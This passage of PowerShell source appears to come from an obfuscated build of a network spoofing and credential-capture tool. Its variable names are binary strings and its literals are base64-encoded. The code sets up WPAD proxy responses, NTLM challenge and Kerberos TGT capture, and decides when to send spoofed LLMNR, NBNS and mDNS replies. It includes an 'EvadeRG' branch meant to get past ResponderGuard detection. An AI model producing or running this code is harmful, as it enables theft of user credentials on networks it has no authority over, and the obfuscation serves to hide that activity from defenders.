            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABQAG8AcgB0ACAAPQAgACQAUAByAG8AeAB5AFAAbwByAHQA')))) > $null
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIAA9ACAAJABQAHIAbwB4AHkAQQB1AHQAaAA='))))  > $null
            ${00010101001000011} = $ProxyPort + 1
            $ProxyIgnore = ($ProxyIgnore | ? {$_ -and $_.Trim()})
            if($ProxyIgnore.Count -gt 0)
            {
                ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABJAGcAbgBvAHIAZQAgAEwAaQBzAHQAIAA9ACAA'))) + ($ProxyIgnore -join ","))  > $null
            }
            if($ProxyIP -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA='))))
            {
                ${00001011011110100} = $IP
            }
            else
            {
                ${00001011011110100} = $ProxyIP
            }
            if($WPADIP -and $WPADPort)
            {
                $WPADResponse = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7ACQAewAwADAAMQAwADAAMAAxADEAMAAxADEAMAAwADAAMAAxADEAfQAgAHIAZQB0AHUAcgBuACAAIgBQAFIATwBYAFkAIAAkAHsAMAAwADAAMAAxADAAMQAxADAAMQAxADEAMQAwADEAMAAwAH0AOgAkAFAAcgBvAHgAeQBQAG8AcgB0ADsAIABQAFIATwBYAFkAIAAkAFcAUABBAEQASQBQADoAJABXAFAAQQBEAFAAbwByAHQAOwAgAEQASQBSAEUAQwBUACIAOwB9AA==')))
            }
            else
            {
                $WPADResponse = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7ACQAewAwADAAMQAwADAAMAAxADEAMAAxADEAMAAwADAAMAAxADEAfQAgAHIAZQB0AHUAcgBuACAAIgBQAFIATwBYAFkAIAAkAHsAMAAwADAAMAAxADAAMQAxADAAMQAxADEAMQAwADEAMAAwAH0AOgAkAFAAcgBvAHgAeQBQAG8AcgB0ADsAIABQAFIATwBYAFkAIAAkAHsAMAAwADAAMAAxADAAMQAxADAAMQAxADEAMQAwADEAMAAwAH0AOgAkAHsAMAAwADAAMQAwADEAMAAxADAAMAAxADAAMAAwADAAMQAxAH0AOwAgAEQASQBSAEUAQwBUACIAOwB9AA==')))
            }
        }
    }
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAPQAgACQAVwBQAEEARABBAHUAdABoAA=='))))  > $null
    if($WPADAuth -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAqAA=='))))
    {
        $WPADAuthIgnore = ($WPADAuthIgnore | ? {$_ -and $_.Trim()})
        if($WPADAuthIgnore.Count -gt 0)
        {
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAATgBUAEwATQAgAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAATABpAHMAdAAgAD0AIAA='))) + ($WPADAuthIgnore -join ","))  > $null
        }
    }
    if($WPADDirectHosts)
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAARABpAHIAZQBjAHQAIABIAG8AcwB0AHMAIAA9ACAA'))) + ($WPADDirectHosts -join ","))  > $null
    }
    if($WPADResponse -and $Proxy -eq 'N')
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAAUgBlAHMAcABvAG4AcwBlACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
    }
    elseif($WPADResponse -and $Proxy -eq 'Y')
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAAUAByAG8AeAB5ACAAUgBlAHMAcABvAG4AcwBlACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
        if($WPADIP -and $WPADPort)
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAARgBhAGkAbABvAHYAZQByACAAPQAgACQAVwBQAEEARABJAFAAOgAkAFcAUABBAEQAUABvAHIAdAA='))))  > $null
        }
    }
    elseif($WPADIP -and $WPADPort)
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAAUgBlAHMAcABvAG4AcwBlACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAAPQAgACQAVwBQAEEARABJAFAAOgAkAFcAUABBAEQAUABvAHIAdAA='))))  > $null
        if($WPADDirectHosts)
        {
            foreach(${00000101010111000} in $WPADDirectHosts)
            {
                ${00100011011000011} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBmACAAKABkAG4AcwBEAG8AbQBhAGkAbgBJAHMAKABoAG8AcwB0ACwAIAAiAA=='))) + ${00000101010111000} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgApACkAIAByAGUAdAB1AHIAbgAgACIARABJAFIARQBDAFQAIgA7AA==')))
            }
            $WPADResponse = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7AA=='))) + ${00100011011000011} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAHQAdQByAG4AIAAiAFAAUgBPAFgAWQAgAA=='))) + $WPADIP + ":" + $WPADPort + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgA7AH0A')))
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAARABpAHIAZQBjAHQAIABIAG8AcwB0AHMAIAA9ACAA'))) + ($WPADDirectHosts -join ","))  > $null
        }
        else
        {
            $WPADResponse = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7ACQAewAwADAAMQAwADAAMAAxADEAMAAxADEAMAAwADAAMAAxADEAfQAgAHIAZQB0AHUAcgBuACAAIgBQAFIATwBYAFkAIAAkAFcAUABBAEQASQBQADoAJABXAFAAQQBEAFAAbwByAHQAOwAgAEQASQBSAEUAQwBUACIAOwB9AA==')))
        }
    }
    if($Challenge)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAATgBUAEwATQAgAEMAaABhAGwAbABlAG4AZwBlACAAPQAgACQAQwBoAGEAbABsAGUAbgBnAGUA'))))  > $null
    }
}
if($Kerberos -eq 'Y')
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABLAGUAcgBiAGUAcgBvAHMAIABUAEcAVAAgAEMAYQBwAHQAdQByAGUAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABLAGUAcgBiAGUAcgBvAHMAIABUAEcAVAAgAEYAaQBsAGUAIABPAHUAdABwAHUAdAAgAEMAbwB1AG4AdAAgAD0AIAAkAEsAZQByAGIAZQByAG8AcwBDAG8AdQBuAHQA'))))  > $null
    if($KerberosHostHeader.Count -gt 0)
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABLAGUAcgBiAGUAcgBvAHMAIABUAEcAVAAgAEgAbwBzAHQAIABIAGUAYQBkAGUAcgAgAEwAaQBzAHQAIAA9ACAA'))) + ($KerberosHostHeader -join ","))  > $null
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABLAGUAcgBiAGUAcgBvAHMAIABUAEcAVAAgAEMAYQBwAHQAdQByAGUAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null    
}
if($MachineAccounts -eq 'N')
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABNAGEAYwBoAGkAbgBlACAAQQBjAGMAbwB1AG4AdAAgAEMAYQBwAHQAdQByAGUAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
    ${00101000010000101}.machine_accounts = $false
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABNAGEAYwBoAGkAbgBlACAAQQBjAGMAbwB1AG4AdAAgAEMAYQBwAHQAdQByAGUAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
    ${00101000010000101}.machine_accounts = $true
}
if($ConsoleOutput -ne 'N')
{
    if($ConsoleOutput -ne 'N')
    {
        if($ConsoleOutput -eq 'Y')
        {
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIAA9ACAARgB1AGwAbAA='))))  > $null
        }
        else
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIAA9ACAAJABDAG8AbgBzAG8AbABlAE8AdQB0AHAAdQB0AA=='))))  > $null
        }
    }
    ${00101000010000101}.console_output = $true
    if($ConsoleStatus -eq 1)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAAUwB0AGEAdAB1AHMAIAA9ACAAJABDAG8AbgBzAG8AbABlAFMAdABhAHQAdQBzACAATQBpAG4AdQB0AGUA'))))  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAAUwB0AGEAdAB1AHMAIAA9ACAAJABDAG8AbgBzAG8AbABlAFMAdABhAHQAdQBzACAATQBpAG4AdQB0AGUAcwA='))))  > $null
    }
}
else
{
    if(${00101000010000101}.tool -eq 1)
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQAIABEAHUAZQAgAFQAbwAgAEUAeAB0AGUAcgBuAGEAbAAgAFQAbwBvAGwAIABTAGUAbABlAGMAdABpAG8AbgA='))))  > $null
    }
    else
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
    }
}
if($ConsoleUnique -eq 'Y')
{
    ${00101000010000101}.console_unique = $true
}
else
{
    ${00101000010000101}.console_unique = $false
}
if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($Pcap -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA='))) -and ($PcapTCP -or $PcapUDP)))
{
    if($FileOutput -eq 'Y')
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAGkAbABlACAATwB1AHQAcAB1AHQAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
        ${00101000010000101}.file_output = $true
    }
    if($Pcap -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA='))))
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAGMAYQBwACAATwB1AHQAcAB1AHQAIAA9ACAARgBpAGwAZQA=')))) > $null
        if($PcapTCP)
        {
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAGMAYQBwACAAVABDAFAAIABQAG8AcgB0AHMAIAA9ACAA'))) + ($PcapTCP -join ","))  > $null
        }
        if($PcapUDP)
        {
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAGMAYQBwACAAVQBEAFAAIABQAG8AcgB0AHMAIAA9ACAA'))) + ($PcapUDP -join ","))  > $null
        }
    }
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABPAHUAdABwAHUAdAAgAEQAaQByAGUAYwB0AG8AcgB5ACAAPQAgACQAewAwADAAMQAxADAAMQAxADAAMAAxADAAMQAxADAAMAAwADEAfQA='))))  > $null 
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAGkAbABlACAATwB1AHQAcAB1AHQAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
}
if($Pcap -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AbwByAHkA'))))
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAGMAYQBwACAATwB1AHQAcAB1AHQAIAA9ACAATQBlAG0AbwByAHkA'))))
}
if($FileUnique -eq 'Y')
{
    ${00101000010000101}.file_unique = $true
}
else
{
    ${00101000010000101}.file_unique = $false
}
if($LogOutput -eq 'Y')
{
    ${00101000010000101}.log_output = $true
}
else
{
    ${00101000010000101}.log_output = $false
}
if($RunCount)
{
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAHUAbgAgAEMAbwB1AG4AdAAgAD0AIAAkAFIAdQBuAEMAbwB1AG4AdAA=')))) > $null
}
if($RunTime -eq 1)
{
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAHUAbgAgAFQAaQBtAGUAIAA9ACAAJABSAHUAbgBUAGkAbQBlACAATQBpAG4AdQB0AGUA'))))  > $null
}
elseif($RunTime -gt 1)
{
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAHUAbgAgAFQAaQBtAGUAIAA9ACAAJABSAHUAbgBUAGkAbQBlACAATQBpAG4AdQB0AGUAcwA='))))  > $null
}
if($ShowHelp -eq 'Y')
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABSAHUAbgAgAFMAdABvAHAALQBJAG4AdgBlAGkAZwBoACAAdABvACAAcwB0AG8AcAA='))))  > $null
    if(${00101000010000101}.console_output)
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAHIAZQBzAHMAIABhAG4AeQAgAGsAZQB5ACAAdABvACAAcwB0AG8AcAAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA='))))  > $null
    }
}
while(${00101000010000101}.output_queue.Count -gt 0)
{
    switch -Wildcard (${00101000010000101}.output_queue[0])
    {
        {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
        {
            if(${00101000010000101}.status_output -and ${00101000010000101}.output_stream_only)
            {
                echo(${00101000010000101}.output_queue[0] + ${00101000010000101}.newline)
            }
            elseif(${00101000010000101}.status_output)
            {
                Write-Warning(${00101000010000101}.output_queue[0])
            }
            if(${00101000010000101}.file_output)
            {
                ${00101000010000101}.log_file_queue.Add(${00101000010000101}.output_queue[0]) > $null
            }
            if(${00101000010000101}.log_output)
            {
                ${00101000010000101}.log.Add(${00101000010000101}.output_queue[0]) > $null
            }
            ${00101000010000101}.output_queue.RemoveAt(0)
        }
        default
        {
            if(${00101000010000101}.status_output -and ${00101000010000101}.output_stream_only)
            {
                echo(${00101000010000101}.output_queue[0] + ${00101000010000101}.newline)
            }
            elseif(${00101000010000101}.status_output)
            {
                echo(${00101000010000101}.output_queue[0])
            }
            if(${00101000010000101}.file_output)
            {
                if (${00101000010000101}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA=')))) -or ${00101000010000101}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIAA=')))))
                {
                    ${00101000010000101}.log_file_queue.Add(${00101000010000101}.output_queue[0]) > $null
                }
                else
                {
                    ${00101000010000101}.log_file_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAZABhAGMAdABlAGQAXQA=')))) > $null    
                }
            }
            if(${00101000010000101}.log_output)
            {
                ${00101000010000101}.log.Add(${00101000010000101}.output_queue[0]) > $null
            }
            ${00101000010000101}.output_queue.RemoveAt(0)
        }
    }
}
${00101000010000101}.status_output = $false
${10000101011101001} =
{
    function _01111000101011100
    {
        param ([Int]${_01110001111000010},[Byte[]]${_01001100010001111})
        ${00000011011111101} = [System.BitConverter]::ToUInt16(${_01001100010001111}[${_01110001111000010}..(${_01110001111000010} + 1)],0)
        return ${00000011011111101}
    }
    function _01000101000111111
    {
        param ([Int]${_01110001111000010},[Byte[]]${_01001100010001111})
        ${00000011011111101} = [System.BitConverter]::ToUInt32(${_01001100010001111}[${_01110001111000010}..(${_01110001111000010} + 3)],0)
        return ${00000011011111101}
    }
    function _01010001111100011
    {
        param ([Int]${_01110001111000010},[Int]${_00011001011000011},[Byte[]]${_01001100010001111})
        ${00100100010001010} = [System.BitConverter]::ToString(${_01001100010001111}[${_01110001111000010}..(${_01110001111000010} + ${_00011001011000011} - 1)])
        ${00100100010001010} = ${00100100010001010} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${00100100010001010} = ${00100100010001010}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${10100110111110111} = New-Object System.String (${00100100010001010},0,${00100100010001010}.Length)
        return ${10100110111110111}
    }
    function _01111101011010101($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt16($field,0)
    }
    function Convert-DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt32($field,0)
    }
    function _00011011100101100
    {
        param ([String]${_01000110101110010},[String]${_10110011101001001},[String]${_10110000100111011},[String]${_10101011010010001},[byte]${_10111010100100110})
        if(${_01000110101110010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuACoA'))))
        {
            [Array]${00111110010010010} = ${_01000110101110010}.Split('.')
            ${01011111101010110} = ${00111110010010010}[0]
        }
        ${01001101001010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
        if($Inspect)
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBpAG4AcwBwAGUAYwB0ACAAbwBuAGwAeQBdAA==')))
        }
        elseif(${_10101011010010001} -eq 'N')
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBzAHAAbwBvAGYAZQByACAAZABpAHMAYQBiAGwAZQBkAF0A')))
        }
        elseif($SpooferHostsReply -and ($SpooferHostsReply -notcontains ${_01000110101110010} -and $SpooferHostsReply -notcontains ${01011111101010110}))
        {
            ${10011101000010111} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAwADEAMAAwADAAMQAxADAAMQAwADEAMQAxADAAMAAxADAAfQAgAG4AbwB0ACAAbwBuACAAcgBlAHAAbAB5ACAAbABpAHMAdABdAA==')))
        }
        elseif($SpooferHostsIgnore -contains ${_01000110101110010} -or $SpooferHostsIgnore -contains ${01011111101010110})
        {
            ${10011101000010111} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAwADEAMAAwADAAMQAxADAAMQAwADEAMQAxADAAMAAxADAAfQAgAGkAcwAgAG8AbgAgAGkAZwBuAG8AcgBlACAAbABpAHMAdABdAA==')))
        }
        elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains ${10100011000000011})
        {
            ${10011101000010111} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAMQAwADEAMAAwADAAMQAxADAAMAAwADAAMAAwADAAMQAxAH0AIABuAG8AdAAgAG8AbgAgAHIAZQBwAGwAeQAgAGwAaQBzAHQAXQA=')))
        }
        elseif($SpooferIPsIgnore -contains ${10100011000000011})
        {
            ${10011101000010111} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAMQAwADEAMAAwADAAMQAxADAAMAAwADAAMAAwADAAMQAxAH0AIABpAHMAIABvAG4AIABpAGcAbgBvAHIAZQAgAGwAaQBzAHQAXQA=')))
        }
        elseif(${00101000010000101}.valid_host_list -contains $query_string -and ($SpooferHostsReply -notcontains ${_01000110101110010} -and $SpooferHostsReply -notcontains ${01011111101010110}))
        {
            ${10011101000010111} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHEAdQBlAHIAeQBfAHMAdAByAGkAbgBnACAAaQBzACAAYQAgAHYAYQBsAGkAZAAgAGgAbwBzAHQAXQA=')))
        }
        elseif($SpooferRepeat -eq 'Y' -and ${00101000010000101}.IP_capture_list -contains ${10100011000000011}.IPAddressToString)
        {
            ${10011101000010111} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBwAHIAZQB2AGkAbwB1AHMAIAAkAHsAMQAwADEAMAAwADAAMQAxADAAMAAwADAAMAAwADAAMQAxAH0AIABjAGEAcAB0AHUAcgBlAF0A')))
        }
        elseif(${_10110011101001001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwA='))) -and ${10100011000000011}.IPAddressToString -eq $IP)
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBsAG8AYwBhAGwAIABxAHUAZQByAHkAXQA=')))
        }
        elseif($SpooferLearning -eq 'Y' -or $SpooferLearningDelay -and ${10011101110100111}.Elapsed -lt ${01000100110100001})
        {
            ${10011101000010111} = ": " + [Int]($SpooferLearningDelay - ${10011101110100111}.Elapsed.TotalMinutes) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABtAGkAbgB1AHQAZQAoAHMAKQAgAHUAbgB0AGkAbAAgAHMAcABvAG8AZgBpAG4AZwAgAHMAdABhAHIAdABzAA==')))
        }
        elseif(${_10110011101001001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwA='))) -and $NBNSTypes -notcontains ${01110100101111101})
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAEIATgBTACAAdAB5AHAAZQAgAGQAaQBzAGEAYgBsAGUAZABdAA==')))
        }
        elseif(${_10110011101001001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwA='))) -and ${_10111010100100110} -eq 33)
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAEIAUwBUAEEAVAAgAHIAZQBxAHUAZQBzAHQAXQA=')))
        }
        elseif($EvadeRG -eq 'Y' -and ${_10110011101001001} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -and ${_10110011101001001} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMA'))) -and ${10101101011010000}.IPAddressToString -eq $IP)
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBwAG8AcwBzAGkAYgBsAGUAIABSAGUAcwBwAG8AbgBkAGUAcgBHAHUAYQByAGQAIAByAGUAcQB1AGUAcwB0ACAAaQBnAG4AbwByAGUAZABdAA==')))
            ${01001101001010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0A')))
        }
        elseif(${_10110011101001001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -and ${_10110000100111011} -and $mDNSTypes -notcontains ${_10110000100111011})
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBtAEQATgBTACAAdAB5AHAAZQAgAGQAaQBzAGEAYgBsAGUAZABdAA==')))
        }
        elseif(${_10110011101001001} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -and ${_10110011101001001} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMA'))) -and $SpooferThresholdHost -gt 0 -and @(${00101000010000101}.request_table.${_01000110101110010} | ? {$_ -match ${10100011000000011}.IPAddressToString}).Count -le $SpooferThresholdHost)
        {
            ${10011101000010111} = "[SpooferThresholdHost >= $(@(${00101000010000101}.request_table.${_01000110101110010} | ? {$_ -match ${10100011000000011}.IPAddressToString}).Count)]"
        }
        elseif(${_10110011101001001} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -and ${_10110011101001001} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMA'))) -and $SpooferThresholdNetwork -gt 0 -and @(${00101000010000101}.request_table.${_01000110101110010} | sort | gu).Count -le $SpooferThresholdNetwork)
        {
            ${10011101000010111} = "[SpooferThresholdNetwork >= $(@(${00101000010000101}.request_table.${_01000110101110010} | sort | gu).Count)]"
        }
        elseif(${_01000110101110010} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBeAFwAeAAwADAALQBcAHgANwBGAF0AKwA='))))
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBuAG8AbgBwAHIAaQBuAHQAYQBiAGwAZQAgAGMAaABhAHIAYQBjAHQAZQByAHMAXQA=')))
        }
        else
        {
            ${10011101000010111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A')))
        }
        return ${01001101001010111},${10011101000010111}
    }
    function _01110000001101110([String]${_10100000010110111})
    {
        switch (${_10100000010110111})
        {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxAC0ANAAxAA==')))
            {
                ${01110100101111101} = "00"
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxAC0ANAAyAA==')))
            {
                ${01110100101111101} = "01"
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxAC0ANAAzAA==')))
            {
                ${01110100101111101} = "02"
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAxAC0ANAA0AA==')))
            {
                ${01110100101111101} = "03"
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAzAC0ANAAxAA==')))
            {
                ${01110100101111101} = "20"
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAC0ANABDAA==')))
            {
                ${01110100101111101} = "1B"
            }
